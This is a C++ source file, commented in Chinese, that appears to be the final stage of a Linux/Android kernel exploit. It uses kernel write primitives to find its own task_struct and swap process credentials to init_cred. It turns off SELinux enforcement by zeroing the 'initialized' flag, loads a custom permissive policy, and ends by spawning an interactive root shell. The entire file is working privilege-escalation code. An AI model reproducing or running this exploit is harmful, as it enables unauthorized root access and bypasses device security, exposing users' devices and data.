#include <cerrno>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <csignal>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <unistd.h>
#include "../const.h"
#include "../prim/prim.h"
#include "const.h"
#include <linux/prctl.h>
#include <sys/prctl.h>
#include "misc.h"
#include "../tools.h"
void load_policy_then_root() {
    // 加载自定义 policy：不换主线程 cred（换了之后信号 handler 无权建阻塞文件，写原语失效），
    // 所以子进程换成 init_cred 去写 /sys/fs/selinux/load，用共享内存通信。
    Print print("Parent");
    // QEMU 是 root ，先降成普通用户
    if (!getenv("PAD")) {
        if (syscall(SYS_setuid, 1000) != 0) {
            print("降权失败：", strerror(errno));
            exit(1);
        }
        print("降权完成：uid = ", getuid());
    }

    //task_struct在直接映射区，地址检查会误拦截
    setenv("SKIP_ADDR_GUARD", "1", 1);

    // 先把两个工作线程开出来，再给自己改名，否则新的线程继承 "glroot!!"
    Prim::getInstance();
    if (prctl(PR_SET_NAME, PARENT_COMM) != 0) {
        print("改进程名失败");
        exit(1);
    }

    unsigned long prev_list_head{}, comm{}, task{};
    read_comm_prev(INIT_TASK, comm, prev_list_head);
    print("开始找父进程的task_struct");
    for (int hop = 0; hop <= MAX_HOPS; ++hop) {
        if (!is_kptr(prev_list_head)) {
            print("节点不像内核指针=", ultohex(prev_list_head, true), " 停止");
            exit(1);
        }
        if (comm == PARENT_COMM_HEAD) {
            print("往回走 ",hop," 跳找到自己");
            break;
        }
        if (hop == MAX_HOPS) {
            print("走了 ", MAX_HOPS, " 跳还没找到自己，放弃");
            exit(1);
        }
        task = prev_list_head - 1752;
        read_comm_prev(task, comm, prev_list_head);
    }

    blob2memory(print);//blob加载到内存
    gate(print); //检查本轮有没有跑过exp
    //父子进程通信用
    void *mem = mmap(nullptr, 4096, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    if (mem == MAP_FAILED) {
        print("共享内存建立失败 ",strerror(errno));
        exit(1);
    }
    auto sh = new (mem)ShareMem;//跑std::atomic构造函数
    auto child_pid = fork();
    if (child_pid < 0) {
        print("fork 失败 ",strerror(errno));
        exit(1);
    }
    if (child_pid == 0) {
        //严格来说，prctl不是异步信号安全函数，但是Linux上通常安全
        prctl(PR_SET_NAME, CHILD_COMM);
        child_wait_cmd(sh); //子进程轮询父进程是否有命令
    }

    //换子进程cred
    unsigned long child_task = find_child_task(task, print);
    unsigned long init_cred = LINK_INIT_CRED + kaslr_slide;
    print("把子进程换成 init_cred...");
    // 寄生写落 cred+8（init_cred 的 gid），
    // 父进程换完 cred 用裸 setresgid/setresuid 让内核复制一份干净 cred。
    write_1_rt(child_task + OFF_REAL_CRED, init_cred);
    write_1_rt(child_task + OFF_CRED, init_cred);
    notify_child(sh, CMD_GETUID);
    if (sh->rc != 0) {
        print("子进程uid != 0：uid = ", sh->rc);
        clean_child(child_pid, child_task, sh);
        exit(1);
    }
    // 子进程open()：DAC 靠 uid0，SELinux 文件权限靠 kernel 域
    notify_child(sh, CMD_OPEN_LOAD);
    if (sh->rc < 0) {
        print("子进程打开",PATH_LOAD,"失败：",strerror(sh->err));
        clean_child(child_pid, child_task, sh);
        exit(1);
    }
    print("子进程打开",PATH_LOAD,"成功");

    // 载入自定义policy
    print("即将把initialized写成0以载入策略，期间屏幕卡死是正常现象，如果持续卡死，长按音量+-和电源键强制重启");
    //写 initialized = 0，直到恢复1前设备屏幕会卡死（内核、adb活着）
    //PAYLOAD = 槽0，走到这肯定已用槽0，寄生写无害；此地址低字节是0x00
    //不过VICTIM覆盖了其他字段（policycap[6]、android_netlink_route），目前没问题就不管
    Prim::getInstance().write_link(LINK_SELINUX_STATE, 0, 2);
    print("initialized已是0");

    //initialized = 0 时全局放行。生成write policy文件放行的avc节点
    //恢复initialized = 1 时命中avc，放行write policy
    //不能真加载新策略，于是故意写大文件触发EFBIG
    notify_child(sh, CMD_GENERATE_AVC);
    if (sh->err != EFBIG) {
        print("子进程未触发EFBIG, errno=", strerror(sh->err));
        clean_child(child_pid, child_task, sh);
        exit(1);
    }
    print("子进程触发EFBIG成功，AVC节点已生成");
    Prim::getInstance().write_link(LINK_SELINUX_STATE, LINK_LOCK_START+8, 1);
    print("initialized已写回1，设备屏幕应恢复正常");
    notify_child(sh, CMD_WRITE_LOAD);
    if (sh->err == 0) {
        print("子进程加载自定义SELinux策略成功");
    }
    else {
        print("子进程加载自定义SELinux策略失败：",strerror(sh->err));
        clean_child(child_pid, child_task, sh);
        exit(1);
    }
    notify_child(sh, CMD_CLOSE);

    // 子进程换回原始cred，防止退出减少init_cred引用计数
    clean_child(child_pid, child_task, sh);
    // 载入成功后策略已是全类型 permissive ⇒ 换自己 cred 也不会再丢写原语。
    print("把本进程 cred 换成 init_cred并修复寄生写");
    write_1_rt(task + OFF_REAL_CRED, init_cred);
    write_1_rt(task + OFF_CRED, init_cred);
    if (getuid() != 0) {
        print("本进程 cred 没换过去 uid= ",getuid());
        exit(1);
    }
    // init_cred 的gid suid被写原语的寄生写踩成了垃圾。
    // 现在我们有 CAP_SETGID/CAP_SETUID，让内核为自己复制一份干净 cred 即可：0→0 转换不会触发
    // ⚠ 必须用裸 syscall：glibc 的 setgroups/setresuid/setresgid 走 NPTL setxid 广播
    // （给进程内每个线程发 SIGSETXID + futex 等确认），在这条被打坏的 PI 链上必 SIGSEGV。
    if (syscall(SYS_setgid, 0) < 0) {
        print("setgid失败：",strerror(errno));
        exit(1);
    }
    if (syscall(SYS_setresuid, -1, -1, 0) < 0) {
        print("setsuid失败：",strerror(errno));
        exit(1);
    }
    uid_t ph1, ph2, suid = 233;
    syscall(SYS_getresuid, &ph1, &ph2, &suid);
    print("修正后，gid = ", getgid()," suid = ", suid);

    print("════════ 交互式 root shell ════════");
    print("用户的测试版shell");
    char *argv[] = {(char*)"/system/bin/sh", (char*)"-i", nullptr};
    char *envp[] = {
        (char*)"PATH=/system/bin",
        (char*)"TERM=xterm-256color",
        (char*)"HOME=/", nullptr
    };
    execve("/system/bin/sh", argv, envp);
    print("══════ 交互式 root shell 结束 ══════");
}